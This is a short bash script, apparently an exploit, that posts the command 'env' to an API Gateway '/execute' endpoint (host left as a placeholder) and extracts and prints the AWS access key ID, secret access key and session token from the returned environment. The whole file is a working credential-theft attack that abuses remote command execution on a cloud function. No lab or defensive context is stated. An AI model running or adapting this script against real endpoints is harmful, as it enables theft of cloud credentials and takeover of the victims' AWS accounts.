#!/bin/bash

# Send the command to the server
response=$(curl -s -X POST https://<API GOES HERE>.amazonaws.com/execute \
-H "Content-Type: application/json" \
-d '{"command":"env"}')

# Use awk to extract values
AWS_SESSION_TOKEN=$(echo "$response" | awk -F'=' '/AWS_SESSION_TOKEN/{print $2}')
AWS_SECRET_ACCESS_KEY=$(echo "$response" | awk -F'=' '/AWS_SECRET_ACCESS_KEY/{print $2}')
AWS_ACCESS_KEY_ID=$(echo "$response" | awk -F'=' '/AWS_ACCESS_KEY_ID/{print $2}')

# Trim trailing characters if needed
AWS_SESSION_TOKEN=$(echo $AWS_SESSION_TOKEN | tr -d '"\r\n')
AWS_SECRET_ACCESS_KEY=$(echo $AWS_SECRET_ACCESS_KEY | tr -d '"\r\n')
AWS_ACCESS_KEY_ID=$(echo $AWS_ACCESS_KEY_ID | tr -d '"\r\n')

# Print the extracted values
echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
echo "AWS_SESSION_TOKEN: $AWS_SESSION_TOKEN"
